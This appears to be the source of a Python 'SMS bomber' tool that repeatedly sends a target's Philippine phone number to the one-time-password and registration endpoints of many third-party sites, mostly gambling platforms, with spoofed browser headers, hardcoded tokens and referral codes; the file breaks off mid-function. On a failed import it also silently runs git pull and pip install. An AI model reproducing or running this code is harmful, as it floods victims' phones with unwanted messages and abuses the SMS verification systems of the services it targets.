import requests
import time
import sys
import os
import base64
import json
import datetime
import random
import string
try:
    from requests_toolbelt.multipart.encoder import MultipartEncoder
    from icecream import ic
    from multiprocessing.pool import ThreadPool
except:
    os.system("git pull")
    os.system("pip install -r requirements.txt")
    os.system("python run.py")
blue = "\033[1;96m"
white = "\033[1;97m"
green = "\033[1;92m"
red = "\033[1;91m"
yellow = "\033[1;93m"
line = ("\033[1;92m╔═"+57*"\033[1;92m═")
line2 = ("\033[1;92m║"+58*"\033[1;92m═")
logo = (""" \033[1;92m____  _   _ _                     _
|  _ \| | | | |__   ___  _ __ ___ | |__   ___ _ __
| |_) | |_| | '_ \ / _ \| '_ ` _ \| '_ \ / _ \ '__|
|  __/|  _  | |_) | (_) | | | | | | |_) |  __/ |
|_|   |_| |_|_.__/ \___/|_| |_| |_|_.__/ \___|_|
 by aknown version 1.4""")
if sys.platform == "linux" or sys.platform == "linux2":
    clr = "clear"
elif sys.platform == "win32" or sys.platform == "cygwin" or sys.platform == "msys":
    clr = "cls"
session = requests.Session()


def log(msg):
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"\033[1;92m║ {green}{current_time}: {msg}{white}")
    return


def log_error(msg):
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"\033[1;92m║ {red}{current_time}: {msg}{white}")
    return


if sys.version_info[0] != 3:
    os.system('clear')
    print(logo)
    print(65 * '\033[1;92m=')
    print('''\t\tREQUIRED PYTHON 3.x\n\t\tinstall and try: python3 run.py\n''')
    print(65 * '\033[1;92m═')
    sys.exit()

LIMIT = 0
LIMIT1 = 0
ERROR = 0
SLEEP = 0
RUN = True
debug = False
debugError = False


# def to9(number) -> str:
#     if str(number[0]) == "0":
#         number = str(number[1:])
#     elif str(number[0]) == "+":
#         number = str(number[3:])
#     elif str(number[:2]) == "63":
#         number = str(number[:2])
#     else:
#         pass
#     return number


# def to639(number) -> str:
#     if str(number[0]) == "0":
#         number = number.replace(str(number[0]), "63")
#     elif str(number[0]) == "+":
#         number = number.replace("+", "")
#     else:
#         pass
#     return number


# def toplus63(number) -> str:
#     if str(number[0]) == "0":
#         number = "+63"+str(number[1:])
#     elif str(number[:2]) == "63":
#         number = "+"+str(number)
#     else:
#         pass
#     return number


# def to09(number) -> str:
#     if str(number[0]) == "+":
#         number = "0"+str(number[1:])
#     elif str(number[:2]) == "63":
#         number = "0"+str(number[2:])
#     else:
#         pass
#     return number
# # api0


def to9(number) -> str:
    number_str = str(number)
    if number_str.startswith("0"):
        number = number_str[1:]
    elif number_str.startswith("+"):
        number = number_str[3:]
    elif number_str.startswith("63"):
        number = number_str[2:]
    return number


def to639(number) -> str:
    number_str = str(number)
    if number_str.startswith("0"):
        number = "63" + number_str[1:]
    elif number_str.startswith("+"):
        number = number_str[1:]
    return number


def toplus63(number) -> str:
    number_str = str(number)
    if number_str.startswith("0"):
        number = "+63" + number_str[1:]
    elif number_str.startswith("63"):
        number = "+" + number_str
    return number


def to09(number) -> str:
    number_str = str(number)
    if number_str.startswith("+"):
        number = "0" + number_str[1:]
    elif number_str.startswith("63"):
        number = "0" + number_str[2:]
    return number


def otp(number):
    global LIMIT, ERROR
    number = to9(number=number)
    url = "https://api2.cocacolahightech.com/login/sendCode"
    header = {'Host': 'api2.cocacolahightech.com', 'Connection': 'keep-alive', 'Content-Length': '30', 'sec-ch-ua': '"Microsoft Edge";v="117", "Not;A=Brand";v="8", "Chromium";v="117"', 'content-type': 'application/x-www-form-urlencoded', 'sec-ch-ua-mobile': '?0', 'Authorization': 'Bearer',
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.60', 'sec-ch-ua-platform': '"Windows"', 'Accept': '*/*', 'Origin': 'https://www.cocacolahightech.com', 'Sec-Fetch-Site': 'same-site', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://www.cocacolahightech.com/', 'Accept-Encoding': 'gzip', 'Accept-Language': 'en-US,en;q=0.9'}
    body = {"mobile": str(number), "code": "", "type": 0}
    try:
        web = requests.post(url, headers=header, json=body, timeout=8)
        r = json.loads(web.text)
        if debug == True:
            print(f"{r} from cocacolahightech")
        if r["code"] == 200:
            LIMIT += 1
            return True
        else:
            ERROR += 1
            return False
    except Exception as e:
        ERROR += 1
        if debugError == True:
            print(f"\033[1;91mError cocacola {e}\033[1;92m")
        return False
# api1


def otp1(number):
    global LIMIT, ERROR
    number = to639(number=number)
    url = "https://api.skpools.pro/api/v1/send/msg"
    header = {'Host': 'api.skpools.pro', 'Connection': 'keep-alive', 'Content-Length': '35', 'sec-ch-ua': '"Microsoft Edge";v="117", "Not;A=Brand";v="8", "Chromium";v="117"', 'sec-ch-ua-platform': '"Windows"', 'sec-ch-ua-mobile': '?0',
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.60', 'Content-Type': 'application/json', 'Accept': '*/*', 'Origin': 'https://skpools.pro', 'Sec-Fetch-Site': 'same-site', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://skpools.pro/', 'Accept-Encoding': 'gzip', 'Accept-Language': 'en-US,en;q=0.9'}
    body = {"phone": str(number), "type": "1"}
    try:
        web = requests.post(url, headers=header, json=body, timeout=8)
        r = json.loads(web.text)
        if debug == True:
            print(f"{r} from skpools")
        if r["code"] == 200:
            LIMIT += 1
            time.sleep(60)
            return True
        else:
            ERROR += 1
            return False
    except Exception as e:
        ERROR += 1
        if debugError == True:
            print(f"\033[1;91mError otp1 {e}\033[1;92m")
        return False
# api2


def otp2(number):
    global LIMIT, ERROR
    number = to9(number=number)

    def bencoder(string):
        string = covert_to_string(string)
        string = string.encode("ascii")
        data = base64.b64encode(string)
        data = data.decode("ascii")
        return data

    def covert_to_string(string):
        string = str(string)
        string = string.replace('\'', '"')
        string = string.replace(" ", '')
        return string

    def get_timestamp():
        url = "http://login.ma7hrte3s4d5r6t.com:80/info"
        header = {'Host': 'login.ma7hrte3s4d5r6t.com', 'User-Agent': 'UnityPlayer/2019.2.11f1 (UnityWebRequest/1.0, libcurl/7.52.0-DEV)', 'Accept': '*/*',
                  'Accept-Encoding': 'deflate, gzip', 'Content-Type': 'application/x-www-form-urlencoded', 'X-Unity-Version': '2019.2.11f1', 'Content-Length': '96'}
        body = {
            "content": "eyJ0eXBlIjoxLCJsdWFWZXIiOiIxMDY0MyIsInJlc1ZlciI6IjEwNjQyIiwiYXBwVmVyIjoiMS4wLjAifQ=="}
        web = requests.post(url, headers=header, data=body)
        page = json.loads(web.text)
        return page["svrTime"]

    url = "http://login.ma7hrte3s4d5r6t.com:80/verifyCode"
    header = {'Host': 'login.ma7hrte3s4d5r6t.com', 'User-Agent': 'UnityPlayer/2019.2.11f1 (UnityWebRequest/1.0, libcurl/7.52.0-DEV)', 'Accept': '*/*',
              'Accept-Encoding': 'deflate, gzip', 'Content-Type': 'application/x-www-form-urlencoded', 'X-Unity-Version': '2019.2.11f1', 'Content-Length': '228'}
    str_body = {"timestamp": str(get_timestamp), "phoneArea": "063", "token": "074075569cc8ba75714fbbe39bf89590",
                "type": 1, "deviceCode": "beeffdbe2c54e77829192d7ec31f5b4e", "phone": str(number)}
    encrypt_body = bencoder(str(str_body))
    body = {"content": str(encrypt_body)}
    try:
        web = requests.post(url, headers=header, data=body, timeout=8)
        r = json.loads(web.text)
        if debug == True:
            print(f"{r} from ma7hrte")
        if r["code"] == 0:
            LIMIT += 1
            return True
        else:
            ERROR += 1
            return False
    except Exception as e:
        ERROR += 1
        if debugError == True:
            print(f"\033[1;91mError otp2 {e}\033[1;92m")
        return False
# api3


def otp3(number):
    global LIMIT, ERROR
    number = toplus63(number=number)
    url = "https://graphql.toktok.ph:2096/auth/graphql/"
    header = {'accept': '*/*', 'authorization': '', 'Content-Type': 'application/json', 'Content-Length': '199',
              'Host': 'graphql.toktok.ph:2096', 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/4.9.1'}
    body = {"operationName": "loginRegister", "variables": {"input": {"mobile": str(
        number), "appFlavor": "C"}}, "query": "mutation loginRegister($input: LoginRegisterInput!) {\nloginRegister(input: $input)\n}\n"}
    try:
        web = requests.post(url, headers=header, json=body, timeout=8)
        r = json.loads(web.text)
        time.sleep(5)
        if debug == True:
            print(f"{r} from toktok")
        if r["data"]["loginRegister"] == "REGISTER":
            LIMIT += 1
            return True
        else:
            ERROR += 1
            return False

    except Exception as e:
        ERROR += 1
        if debugError == True:
            print(f"\033[1;91mError otp3 {e}\033[1;92m")
        return False
# api4


def otp4(number):
    global LIMIT, ERROR
    number = to09(number=number)
    url = "http://8.212.181.240:80/index/user/send_code"
    header = {'Device-Id': '3076685aef999931', 'App-Id': 'UYJEeAtD', 'Authorization': '', 'Content-Type': 'application/json; charset=UTF-8',
              'Content-Length': '23', 'Host': '8.212.181.240', 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/4.9.0'}
    body = {"phone": str(number)}
    try:
        web = requests.post(url, headers=header, json=body, timeout=8)
        r = json.loads(web.text)
        if debug == True:
            print(f"{r} from 777pub 1")
        if r["msg"] == "success":
            LIMIT += 1
            return True
        else:
            ERROR += 1
            return False
    except Exception as e:
        ERROR += 1
        if debugError == True:
            print(f"\033[1;91mError otp4 {e}\033[1;92m")
        return False
# api5


def otp5(number):
    global LIMIT, ERROR
    number = to639(number=number)
    url = "https://api.777pub.app:443/account/get_code"
    header = {'Host': 'api.777pub.app', 'Connection': 'keep-alive', 'Content-Length': '83', 'User-Agent': 'Mozilla/5.0 (Linux; U; Android 12; zh-cn; 2109119BC Build/SKQ1.211006.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/16.8.58 swan-mibrowser', 'Content-Type': 'application/x-www-form-urlencoded',
              'Accept': '*/*', 'Origin': 'https://www.777pub.com', 'X-Requested-With': 'com.happythree.sevengames.pubshow', 'Sec-Fetch-Site': 'cross-site', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://www.777pub.com/?f=UIHall', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'en-US,en;q=0.9'}
    body = {'token': 'MTY3MTY2NTM2NH61idmEdMlptKqwbQ', 'tel': str(
        number), 'type': 0, 'area': '63', 'language': 'en-us'}
    try:
        web = requests.post(url, headers=header, data=body, timeout=8)
        r = json.loads(web.text)
        if debug == True:
            print(f"{r} from 777pub")
        if r["code"] == 0:
            LIMIT += 1
            return True
        else:
            ERROR += 1
            return False
    except Exception as e:
        ERROR += 1
        if debugError == True:
            print(f"\033[1;91mError otp5 {e}\033[1;92m")
        return False
# api6


def otp6(number):
    global LIMIT, ERROR
    number = to9(number=number)
    url = "https://vividzoo.com/index.php/api/sms/send2"
    header = {'Host': 'vividzoo.com', 'Connection': 'keep-alive', 'Content-Length': '32', 'sec-ch-ua': '"Chromium";v="118", "Brave";v="118", "Not=A?Brand";v="99"', 'Content-Type': 'application/x-www-form-urlencoded', 'sec-ch-ua-mobile': '?0',
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36', 'token': '', 'dev': 'H5', 'sec-ch-ua-platform': '"Windows"', 'Accept': '*/*', 'Sec-GPC': '1', 'Accept-Language': 'en-US,en;q=0.7', 'Origin': 'https://vividzoo.com', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://vividzoo.com/h5/pages/login/reg?invite=94376825', 'Accept-Encoding': 'gzip'}

    body = {"mobile": str(number), "event": "register"}

    try:
        web = requests.post(url, headers=header, data=body, timeout=8)
        r = json.loads(web.text)
        if debug == True:
            print(f"{r} from vividzoo")
        if r['code'] == 1:
            LIMIT += 1
            return True
        else:
            ERROR += 1
            return False
    except Exception as e:
        ERROR += 1
        if debugError == True:
            print(f"\033[1;91mError otp6\033[1;92m {e}")
        return False
# api7


def otp7(number):
    global LIMIT, ERROR
    number = to9(number=number)
    session = requests.Session()
    session.get('https://gplayer77.com')
    url = 'https://gplayer77.com/api/vcode/sendVcodeForNotExistUser'
    header = {'Host': 'gplayer77.com', 'Connection': 'keep-alive', 'Content-Length': '32', 'sec-ch-ua': '"Microsoft Edge";v="117", "Not;A=Brand";v="8", "Chromium";v="117"', 'Accept': 'application/json, text/plain, */*', 'Content-Type': 'application/x-www-form-urlencoded', 'sec-ch-ua-mobile': '?0',
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.60', 'sec-ch-ua-platform': '"Windows"', 'Origin': 'https://gplayer77.com', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://gplayer77.com/register', 'Accept-Encoding': 'gzip', 'Accept-Language': 'en-US,en;q=0.9'}
    body = {"mobile": str(number), "countryCode": 63}
    web = session.post(url, headers=header, data=body)
    try:
        web = session.post(url, headers=header, data=body, timeout=8)
        r = json.loads(web.text)
        if debug == True:
            print(f"{r} from gplayer77")
        if r['code'] == 200:
            LIMIT += 1
            return True
        else:
            ERROR += 1
            return False
    except Exception as e:
        ERROR += 1
        if debugError == True:
            print(f"\033[1;91mError otp7 {e}\033[1;92m")
        return False
# api8


def otp8(number):
    global LIMIT, ERROR
    number = to9(number=number)
    session = requests.Session()
    url = "https://api.taibots.com/buyer/send_code"
    header = {'Host': 'api.taibots.com', 'Connection': 'keep-alive', 'Content-Length': '190', 'sec-ch-ua': '"Chromium";v="118", "Brave";v="118", "Not=A?Brand";v="99"', 'Accept': 'application/json, text/plain, */*', 'Content-Type': 'application/x-www-form-urlencoded', 'sec-ch-ua-mobile': '?0',
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36', 'sec-ch-ua-platform': '"Windows"', 'Sec-GPC': '1', 'Accept-Language': 'en-US,en;q=0.6', 'Origin': 'https://www.taibots.com', 'Sec-Fetch-Site': 'same-site', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://www.taibots.com/', 'Accept-Encoding': 'gzip'}

    body = {
        "lang": "us",
        "phone": str(number),
        "country[text]": "Philippines +63",
        "country[value]": "+63",
        "country[abbr]": "ph",
        "captcha": "",
        "key": "$2y$10$q/dRLLwlu7Gyqb8aYs8xgOGKZqzjTBy20EmeuUBUdtCOpyWvGnC4S"
    }
    try:
        web = session.post(url, headers=header, data=body, timeout=8)
        r = json.loads(web.text)
        if debug == True:
            print(f"{web.status_code} from taibots")
        if r['code'] == 0:
            LIMIT += 1
            return True
        else:
            ERROR += 1
            return False
    except Exception as e:
        ERROR += 1
        if debugError == True:
            print(f"\033[1;91mError otp8\033[1;92m")
        return False
# api9


def otp9(number):
    global LIMIT, ERROR
    number = to9(number=number)
    session = requests.Session()
    url = "https://api.ayala-group.top/sendSMS.do"
    header = {'Host': 'api.ayala-group.top', 'Connection': 'keep-alive', 'Content-Length': '24', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Microsoft Edge";v="108"', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded', 'sec-ch-ua-mobile': '?0',
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54', 'sec-ch-ua-platform': '"Windows"', 'sec-gpc': '1', 'Origin': 'https://m.ayala-vip.com/', 'Sec-Fetch-Site': 'cross-site', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://m.ayala-vip.com/', 'Accept-Encoding': 'gzip', 'Accept-Language': 'en-US,en;q=0.9'}
    body = {"mobile": str(number), "type": "3"}
    try:
        web = session.post(url, headers=header, data=body, timeout=8)
        if debug == True:
            print(f"{web.status_code} from ayala group")
        if int(web.status_code) == 200:
            LIMIT += 1
            return True
        else:
            ERROR += 1
            return False
    except Exception as e:
        ERROR += 1
        if debugError == True:
            print(f"\033[1;91mError otp9 {e}\033[1;92m")
        return False
# api10


def otp11(number):
    {"success": True, "value": {"expiredMinutes": 5,
                                "maxAttemptTimes": 10, "expirationTime": 1709109655053}}
    global LIMIT, ERROR
    number = to09(number=number)
    session = requests.Session()
    url = "https://www.luxeplay.ph/wps/verification/sms/register"
    header = {'Host': 'www.luxeplay.ph', 'Connection': 'keep-alive', 'Content-Length': '26', 'X-Gateway-Version': '3', 'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Brave";v="122"', 'Language': 'EN', 'sec-ch-ua-mobile': '?0', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Content-Type': 'application/json',
              'Merchant': 'crazywin', 'Accept': 'application/json, text/plain, */*', 'Device': 'web', 'sec-ch-ua-platform': '"Windows"', 'Sec-GPC': '1', 'Accept-Language': 'en-US,en;q=0.6', 'Origin': 'https://www.luxeplay.ph', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://www.luxeplay.ph/register?affiliateCode=q4l3v', 'Accept-Encoding': 'gzip'}
    body = {"mobileNo": str(number)}

    try:
        web = session.post(url, headers=header, json=body, timeout=8)
        result = json.loads(web.text)
        if debug == True:
            print(f"{web.status_code} from luxeplay")
        if result['success'] == True:
            LIMIT += 1
            try:
                sliip = result['value']['expiredMinutes']*60
                time.sleep(sliip)
            except:
                pass
            return True
        elif result['success'] == False:
            ERROR += 1
            return False
        else:
            ERROR += 1
            return False
    except Exception as e:
        ERROR += 1
        if debugError == True:
            print(f"\033[1;91mError otp11 {e}\033[1;92m")
        return False


def otp12(number):
    {"success": True, "value": {"expiredMinutes": 5,
                                "maxAttemptTimes": 10, "expirationTime": 1709109655053}}
    global LIMIT, ERROR
    number = to9(number=number)
    session = requests.Session()
    url = "https://www.wagi777.app/wps/verification/sms/register"
    header = {'Host': 'www.wagi777.app', 'Connection': 'keep-alive', 'Content-Length': '51', 'X-Gateway-Version': '3', 'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Brave";v="122"', 'Language': 'EN', 'sec-ch-ua-mobile': '?0', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Content-Type': 'application/json',
              'Merchant': 'wagif3', 'Accept': 'application/json, text/plain, */*', 'Device': 'web', 'sec-ch-ua-platform': '"Windows"', 'Sec-GPC': '1', 'Accept-Language': 'en-US,en;q=0.5', 'Origin': 'https://www.wagi777.app', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://www.wagi777.app/', 'Accept-Encoding': 'gzip'}
    body = {"countryDialingCode": "63", "mobileNo": str(number)}

    try:
        web = session.post(url, headers=header, json=body, timeout=8)
        result = json.loads(web.text)
        if debug == True:
            print(f"{web.status_code} from wagi777")
        if result['success'] == True:
            LIMIT += 1
            try:
                sliip = result['value']['expiredMinutes']*60
                time.sleep(sliip)
            except:
                pass
            return True
        elif result['success'] == False:
            ERROR += 1
            return False
        else:
            ERROR += 1
            return False
    except Exception as e:
        ERROR += 1
        if debugError == True:
            print(f"\033[1;91mError otp12 {e}\033[1;92m")
        return False


def otp13(number):
    {"success": True, "value": {"expiredMinutes": 3,
                                "maxAttemptTimes": 10, "expirationTime": 1709226647368}}
    global LIMIT, ERROR
    number = to9(number=number)
    session = requests.Session()
    url = "https://www.wqb753.com/wps/verification/sms/register"
    header = {'Host': 'www.wqb753.com', 'Connection': 'keep-alive', 'Content-Length': '51', 'X-Gateway-Version': '3', 'sec-ch-ua': '"Chromium";v="122", "Not(A', 'Language': 'EN', 'sec-ch-ua-mobile': '?0', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Content-Type': 'application/json', 'Merchant': 'winhq9f2',
              'Accept': 'application/json, text/plain, */*', 'Device': 'web', 'sec-ch-ua-platform': '"Windows"', 'Sec-GPC': '1', 'Accept-Language': 'en-US,en;q=0.9', 'Origin': 'https://www.wqb753.com', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://www.wqb753.com/register?r=ire2079', 'Accept-Encoding': 'gzip'}
    body = {"countryDialingCode": "63", "mobileNo": str(number)}

    try:
        web = session.post(url, headers=header, json=body, timeout=8)
        result = json.loads(web.text)
        if debug == True:
            print(f"{web.status_code} from wqb753")
        if result['success'] == True:
            LIMIT += 1
            try:
                sliip = result['value']['expiredMinutes']*60
                time.sleep(sliip)
            except:
                pass
            return True
        elif result['success'] == False:
            ERROR += 1
            return False
        else:
            ERROR += 1
            return False
    except Exception as e:
        ERROR += 1
        if debugError == True:
            print(f"\033[1;91mError otp13 {e}\033[1;92m")
        return False


def otp14(number):
    global LIMIT, ERROR
    number = to9(number=number)
    session = requests.Session()
    url = "https://edi-wow.com/api/lobby/verify"
    header = {'Host': 'edi-wow.com', 'Connection': 'keep-alive', 'Content-Length': '77', 'sec-ch-ua': '"Chromium";v="122", "Not(A', 'locale': 'en', 'sec-ch-ua-mobile': '?0', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Content-Type': 'application/json', 'Accept': 'application/json, text/plain, */*', 'owner-id': '6236', 'sec-ch-ua-platform': '"Windows"', 'Sec-GPC': '1', 'Accept-Language': 'en-US,en;q=0.6', 'Origin': 'https://edi-wow.com', 'Sec-Fetch-Site':
              'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://edi-wow.com/m/auth/signup', 'Accept-Encoding': 'gzip', 'Cookie': 'i18n_redirected=en'}
    body = {"mobile": str(number), "country": "PHP",
            "username": f"aknownnnn", "type": "register"}

    try:
        web = session.post(url, headers=header, json=body, timeout=8)
        result = json.loads(web.text)
        if debug == True:
            print(f"{web.status_code} from edi wow")
        if result['resCode'] == 200:
            LIMIT += 1
            time.sleep(60)
            return True
        else:
            ERROR += 1
            return False
    except Exception as e:
        ERROR += 1
        if debugError == True:
            print(f"\033[1;91mError otp14 {e}\033[1;92m")
        return False


def otp15(number):
    global LIMIT, ERROR
    number = to09(number=number)
    session = requests.Session()
    url = "https://www.tamabet.tv/wps/verification/sms/register"
    header = {'Host': 'www.tamabet.tv', 'Connection': 'keep-alive', 'Content-Length': '52', 'X-Gateway-Version': '3', 'sec-ch-ua': '"Chromium";v="122", "Not(A', 'Language': 'EN', 'sec-ch-ua-mobile': '?0', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Content-Type': 'application/json', 'Merchant': 'tamabetf2',
              'Accept': 'application/json, text/plain, */*', 'Device': 'web', 'sec-ch-ua-platform': '"Windows"', 'Sec-GPC': '1', 'Accept-Language': 'en-US,en;q=0.8', 'Origin': 'https://www.tamabet.tv', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://www.tamabet.tv/register?affiliateCode=cmbv16', 'Accept-Encoding': 'gzip'}
    body = {"countryDialingCode": "63", "mobileNo": str(number)}

    try:
        web = session.post(url, headers=header, json=body, timeout=8)
        result = json.loads(web.text)
        if debug == True:
            print(f"{web.status_code} from tama bet")
        if result['success'] == True:
            LIMIT += 1
            try:
                sleep = result['value']['expiredMinutes']*60
                time.sleep(sleep)
            except:
                pass
            return True
        else:
            ERROR += 1
            return False
    except Exception as e:
        ERROR += 1
        if debugError == True:
            print(f"\033[1;91mError otp15 {e}\033[1;92m")
        return False


def otp16(number):
    global LIMIT, ERROR
    number = to09(number=number)
    session = requests.Session()
    url = "https://www.luxebet9.com/wps/verification/sms/register"
    header = {'Host': 'www.luxebet9.com', 'Connection': 'keep-alive', 'Content-Length': '26', 'X-Gateway-Version': '3', 'sec-ch-ua': '"Chromium";v="122", "Not(A', 'Language': 'EN', 'sec-ch-ua-mobile': '?0', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Content-Type': 'application/json', 'Merchant': 'crazywin',
              'Accept': 'application/json, text/plain, */*', 'Device': 'web', 'sec-ch-ua-platform': '"Windows"', 'Sec-GPC': '1', 'Accept-Language': 'en-US,en;q=0.7', 'Origin': 'https://www.luxebet9.com', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://www.luxebet9.com/register?affiliateCode=vrc49', 'Accept-Encoding': 'gzip'}
    body = {"mobileNo": str(number)}

    try:
        web = session.post(url, headers=header, json=body, timeout=8)
        result = json.loads(web.text)
        if debug == True:
            print(f"{web.status_code} from luxebet9")
        if result['success'] == True:
            LIMIT += 1
            try:
                sleep = result['value']['expiredMinutes']*60
                time.sleep(sleep)
            except:
                pass
            return True
        else:
            ERROR += 1
            return False
    except Exception as e:
        ERROR += 1
        if debugError == True:
            print(f"\033[1;91mError otp16 {e}\033[1;92m")
        return False


def otp17(number):
    global LIMIT, ERROR
    number = toplus63(number=number)
    session = requests.Session()
    {"msg": "Verification code sent successfully",
        "data": "Verification code sent successfully", "status": 200}
    url = "https://clientapi.shwgwlkj.com/user/get-phone-code"
    boundary = '----WebKitFormBoundary' + \
        ''.join(random.sample(string.ascii_letters +
                string.digits + string.ascii_uppercase, 16))

    fields = {
        'code': 'Masaya365',
        'type': '0',
        'language': 'en',
        'phone': str(number)
    }
    m = MultipartEncoder(fields=fields, boundary=boundary)
    headers = {'Host': 'clientapi.shwgwlkj.com', 'Connection': 'keep-alive', 'Content-Length': '438', 'sec-ch-ua': '"Chromium";v="122", "Not(A', 'Accept': 'application/json, text/javascript, */*; q=0.01', 'Content-Type': f'multipart/form-data; boundary={boundary}', 'sec-ch-ua-mobile': '?0', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
               'sec-ch-ua-platform': '"Windows"', 'Sec-GPC': '1', 'Accept-Language': 'en-US,en;q=0.9', 'Origin': 'https://masaya656.com', 'Sec-Fetch-Site': 'cross-site', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://masaya656.com/', 'Accept-Encoding': 'gzip'}
    try:
        web = session.post(url, headers=headers, data=m.to_string(), timeout=8)
        result = json.loads(web.text)
        if debug:
            print(f"{web.status_code} from clientapi.shwgwlkj.com")
        if result['status'] == 200:
            LIMIT += 1
            time.sleep(61*5)
            return True
        else:
            ERROR += 1
            return False
    except Exception as e:
        print(e)
        ERROR += 1
        if debugError:
            print(f"\033[1;91mError get_phone_code {e}\033[1;92m")
        return False

def otp18(number):
    global LIMIT, ERROR
    number = to9(number=number)
    session = requests.Session()
    url = "https://www.xjrff.com/wps/verification/sms/register"
    header = {'Host': 'www.xjrff.com', 'Connection': 'keep-alive', 'Content-Length': '51', 'X-Gateway-Version': '3', 'sec-ch-ua': '"Chromium";v="122", "Not(A', 'Language': 'EN', 'sec-ch-ua-mobile': '?0', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Content-Type': 'application/json', 'Merchant': 'top188phf2', 'Accept': 'application/json, text/plain, */*', 'Device': 'web', 'sec-ch-ua-platform': '"Windows"', 'Sec-GPC': '1', 'Accept-Language': 'en-US,en;q=0.8', 'Origin': 'https://www.xjrff.com', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://www.xjrff.com/register?referralCode=pai6825', 'Accept-Encoding': 'gzip'}
    body = {"countryDialingCode":"63","mobileNo":str(number)}

    try:
        web = session.post(url, headers=header, json=body, timeout=8)
        result = json.loads(web.text)
        if debug == True:
            print(f"{web.status_code} from xjrff")
        if result['success'] == True:
            LIMIT += 1
            try:
                sleep = result['value']['expiredMinutes']*60
                time.sleep(sleep)
            except:
                pass
            return True
        else:
            ERROR += 1
            return False
    except Exception as e:
        ERROR += 1
        if debugError == True:
            print(f"\033[1;91mError otp18 {e}\033[1;92m")
        return False

def otp19(number):
    global LIMIT, ERROR
    number = to9(number=number)
    session = requests.Session()
    url = "https://admin.skc-app.ru/rest/api/customers/sendVerifyCodeV2"
